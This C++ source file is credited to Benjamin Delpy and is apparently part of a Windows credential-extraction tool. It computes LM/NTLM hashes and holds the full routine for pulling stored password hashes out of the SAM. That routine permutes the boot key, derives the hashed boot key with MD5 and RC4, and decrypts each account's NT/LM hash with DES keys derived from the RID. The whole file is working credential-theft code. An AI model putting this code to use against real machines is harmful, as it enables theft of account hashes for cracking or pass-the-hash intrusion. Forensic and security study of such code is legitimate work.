/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_hash.h"

PSYSTEM_FUNCTION_006 mod_hash::SystemFunction006 = reinterpret_cast<PSYSTEM_FUNCTION_006>(GetProcAddress(GetModuleHandle(L"advapi32"), "SystemFunction006"));
PSYSTEM_FUNCTION_007 mod_hash::SystemFunction007 = reinterpret_cast<PSYSTEM_FUNCTION_007>(GetProcAddress(GetModuleHandle(L"advapi32"), "SystemFunction007"));
PRTL_UPCASE_UNICODE_STRING_TO_OEM_STRING mod_hash::RtlUpcaseUnicodeStringToOemString = reinterpret_cast<PRTL_UPCASE_UNICODE_STRING_TO_OEM_STRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlUpcaseUnicodeStringToOemString"));
PRTL_INIT_UNICODESTRING mod_hash::RtlInitUnicodeString = reinterpret_cast<PRTL_INIT_UNICODESTRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlInitUnicodeString"));
PRTL_FREE_OEM_STRING mod_hash::RtlFreeOemString = reinterpret_cast<PRTL_FREE_OEM_STRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlFreeOemString"));

bool mod_hash::lm(wstring * chaine, wstring * hash)
{
	bool status = false;
	UNICODE_STRING maChaine;
	OEM_STRING maDestination;
	BYTE monTab[16];

	RtlInitUnicodeString(&maChaine, chaine->c_str());
	if(NT_SUCCESS(RtlUpcaseUnicodeStringToOemString(&maDestination, &maChaine, TRUE)))
	{
		if(status = NT_SUCCESS(SystemFunction006(maDestination.Buffer, monTab)))
			hash->assign(mod_text::stringOfHex(monTab, sizeof(monTab)));

		RtlFreeOemString(&maDestination);
	}
	return status;
}

bool mod_hash::ntlm(wstring * chaine, wstring * hash)
{
	bool status = false;
	UNICODE_STRING maChaine;
	BYTE monTab[16];
	
	RtlInitUnicodeString(&maChaine, chaine->c_str());
	if(status = NT_SUCCESS(SystemFunction007(&maChaine, monTab)))
		hash->assign(mod_text::stringOfHex(monTab, sizeof(monTab)));
	return status;
}

void mod_hash::getBootKeyFromKey(BYTE bootkey[0x10], BYTE key[0x10])
{
	BYTE permut[] = {0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04};
	for(unsigned int i = 0; i < 0x10; i++)
		bootkey[i] = key[permut[i]];	
}

void mod_hash::RC4Crypt(BYTE * rc4_key, BYTE * ClearText, BYTE * EncryptBuffer)
{
	HCRYPTPROV hCryptProv = NULL; 
	HCRYPTKEY hKey = NULL;

	if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		KEY_BLOB DesKeyBlob;
		DesKeyBlob.dwDefault = 0x0208;
		DesKeyBlob.dwAlgID = CALG_RC4;
		DesKeyBlob.dwKeyLen = 0x10;
		RtlCopyMemory(DesKeyBlob.Key, rc4_key, sizeof(DesKeyBlob.Key));

		if(CryptImportKey(hCryptProv, (BYTE *)&DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey))
		{
			RtlCopyMemory(EncryptBuffer, ClearText, 0x10);
			DWORD dwWorkingBufferLength = 0x10;
			CryptEncrypt(hKey, NULL, TRUE, 0, EncryptBuffer, &dwWorkingBufferLength, dwWorkingBufferLength);
			CryptDestroyKey(hKey);
		}
		CryptReleaseContext(hCryptProv, 0);
	}
}

bool mod_hash::getHbootKeyFromBootKeyAndF(BYTE hBootKey[0x20], BYTE bootKey[0x10], BYTE * AccountsF)
{
	bool reussite = false;
	unsigned char qwe[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
	unsigned char num[] = "0123456789012345678901234567890123456789";

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTHASH hHash = NULL;
	if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		BYTE md5hash[0x10] = {0};
		DWORD dwHashDataLen = sizeof(md5hash);
		CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
		CryptHashData(hHash, AccountsF + 0x70, 0x10, 0);
		CryptHashData(hHash, qwe, sizeof(qwe), 0);
		CryptHashData(hHash, bootKey, 0x10, 0);
		CryptHashData(hHash, num, sizeof(num), 0);
		CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
		CryptDestroyHash(hHash);
		CryptReleaseContext(hCryptProv, 0);
		RC4Crypt(md5hash, AccountsF + 0x80, hBootKey);
		reussite = true;
	}
	return reussite;
}

bool mod_hash::decryptHash(wstring * hash, BYTE * hBootKey, USER_V * userV, SAM_ENTRY * encHash, unsigned long rid, bool isNtlm)
{
	bool reussite = false;
	unsigned char ntpassword[] = "NTPASSWORD";
	unsigned char lmpassword[] = "LMPASSWORD";

	BYTE obfkey[0x10];
	if(encHash->lenght == 0x10 + 4)
	{
		HCRYPTPROV hCryptProv = NULL;
		HCRYPTHASH hHash = NULL;
		if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			BYTE md5hash[0x10] = {0};
			DWORD dwHashDataLen = 0x10;
			CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
			CryptHashData(hHash, hBootKey, 0x10, 0);
			CryptHashData(hHash, (BYTE *) &rid, sizeof(rid), 0);
			CryptHashData(hHash, isNtlm ? ntpassword : lmpassword, isNtlm ? sizeof(ntpassword) : sizeof(lmpassword), 0);
			CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
			CryptDestroyHash(hHash);
			CryptReleaseContext(hCryptProv, 0);
			RC4Crypt(md5hash, &(userV->datas) + encHash->offset + 4, obfkey);

			if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
			{
				DESKEY_BLOB DesKeyBlob;
				HCRYPTKEY hKey = NULL;

				DWORD dwWorkingBufferLength;

				DesKeyBlob.BlobHeader.bType = PLAINTEXTKEYBLOB;
				DesKeyBlob.BlobHeader.bVersion = CUR_BLOB_VERSION;
				DesKeyBlob.BlobHeader.aiKeyAlg = CALG_DES;
				DesKeyBlob.BlobHeader.reserved = 0;
				DesKeyBlob.dwKeyLen = 8;
				
				sid_to_key1(rid, DesKeyBlob.Key);
				dwWorkingBufferLength = sizeof(obfkey) / 2;
				CryptImportKey(hCryptProv, (BYTE *) &DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey);
				CryptDecrypt(hKey, NULL, TRUE, 0, obfkey, &dwWorkingBufferLength);
				CryptDestroyKey(hKey);
				
				sid_to_key2(rid, DesKeyBlob.Key);
				dwWorkingBufferLength = sizeof(obfkey) / 2;
				CryptImportKey(hCryptProv, (BYTE *) &DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey);
				CryptDecrypt(hKey, NULL, TRUE, 0, obfkey + 8, &dwWorkingBufferLength);
				CryptDestroyKey(hKey);

				reussite = true;
				CryptReleaseContext(hCryptProv, 0);
			}
		}
	}
	hash->assign(reussite ? mod_text::stringOfHex(obfkey, sizeof(obfkey)) : L"");

	return reussite;
}

void mod_hash::str_to_key(unsigned char *str, unsigned char *key)
{
	key[0] = str[0] >> 1;
	key[1] = ((str[0] & 0x01) <<6) | (str[1] >> 2);
	key[2] = ((str[1] & 0x03) <<5) | (str[2] >> 3);
	key[3] = ((str[2] & 0x07) <<4) | (str[3] >> 4);
	key[4] = ((str[3] & 0x0f) <<3) | (str[4] >> 5);
	key[5] = ((str[4] & 0x1f) <<2) | (str[5] >> 6);
	key[6] = ((str[5] & 0x3f) <<1) | (str[6] >> 7);
	key[7] = str[6] & 0x7f;
	for (unsigned int i = 0; i < 8; i++)
		key[i] = (key[i]<<1);
	des_set_odd_parity((DES_cblock *)key);
}

void mod_hash::sid_to_key1(unsigned long sid, unsigned char deskey[8])
{
	unsigned char s[7];
	s[0] = s[4] =	(unsigned char)((sid)		& 0xff);
	s[1] = s[5] =	(unsigned char)((sid >> 8)	& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >>16)	& 0xff);
	s[3] =			(unsigned char)((sid >>24)	& 0xff);
	str_to_key(s, deskey);
}

void mod_hash::sid_to_key2(unsigned long sid, unsigned char deskey[8])
{
	unsigned char s[7];

	s[0] = s[4] =	(unsigned char)((sid >>24)	& 0xff);
	s[1] = s[5] =	(unsigned char)((sid)		& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >> 8)	& 0xff);
	s[3] =			(unsigned char)((sid >>16)	& 0xff);
	str_to_key(s, deskey);
}

void mod_hash::des_set_odd_parity(DES_cblock * key)
{
	static const unsigned char odd_parity[256] = {
	  1,  1,  2,  2,  4,  4,  7,  7,  8,  8, 11, 11, 13, 13, 14, 14,
	 16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	 49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	 64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	 97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
	112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
	128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
	145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
	161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
	176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
	193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
	208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
	224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
	241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254};

	for (unsigned int i = 0; i < 8; i++)
		(*key)[i] = odd_parity[(*key)[i]];
}